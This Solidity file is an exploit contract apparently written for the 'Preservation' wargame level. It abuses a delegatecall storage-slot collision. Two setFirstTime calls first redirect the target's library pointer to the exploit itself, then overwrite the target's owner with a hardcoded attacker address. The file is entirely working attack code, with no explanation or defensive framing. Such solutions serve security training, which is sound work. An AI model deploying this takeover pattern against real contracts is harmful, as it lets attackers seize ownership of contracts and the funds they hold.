// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Preservation.sol";
import "hardhat/console.sol";

contract ExploitPreservation {
    address public target;
    address public __placeholder1;
    address public owner;

    address constant attacker = 0x21db76B75db2f5d4f9505Eae7d8cE53eB9AEd2B5;

    constructor(address _target) public {
        target = _target;
    }

    function execute() external {
        Preservation(target).setFirstTime(uint256(address(this)));
        Preservation(target).setFirstTime(uint256(keccak256("doesnotmatter")));
    }

    function setTime(uint256 _time) public {
        owner = attacker;
    }
}
